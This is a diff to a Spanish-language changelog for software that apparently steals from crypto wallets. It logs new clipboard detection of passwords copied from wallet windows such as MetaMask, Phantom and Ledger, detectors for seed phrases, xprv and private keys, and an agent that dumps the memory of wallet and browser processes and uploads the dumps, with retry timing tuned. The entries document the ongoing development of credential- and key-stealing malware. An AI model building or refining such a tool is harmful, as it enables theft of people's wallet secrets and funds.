@@ -1,5 +1,9 @@
 # Changelog
 
+## 0.2.27
+
+- Portapapeles: una contraseña copiada desde una ventana de cartera (Phantom, MetaMask, Rabby, Exodus, Electrum, Ledger, gestores) se detecta aunque el proceso en primer plano sea el navegador. El aviso incluye proceso y título y usa el formato `clipboard contraseña (proc | title): …`; una ventana neutral como Notepad sigue sin alertar. Los demás detectores (seed, xprv, EVM/Solana) no cambian.
+
 ## 0.2.26
 
 - Carteras: un cambio de título ya no cierra la sesión. El watcher conserva `(nombre, pid, arranque)` durante 20 s y solo emite `LOST` si el proceso murió o pasa la gracia; el agente vuelve a comprobar que el PID siga vivo antes de limpiar. El cooldown se aplica también a la misma clave (el bypass persistido vale solo para el primer `DETECT` tras un reinicio) y un proceso vivo ya volcado no repite aviso ni volcado. Los navegadores bajan a un único intento para no subir tres volcados de ~190 MB por apertura; Electrum/Ledger/Exodus mantienen los reintentos 60/180 s.
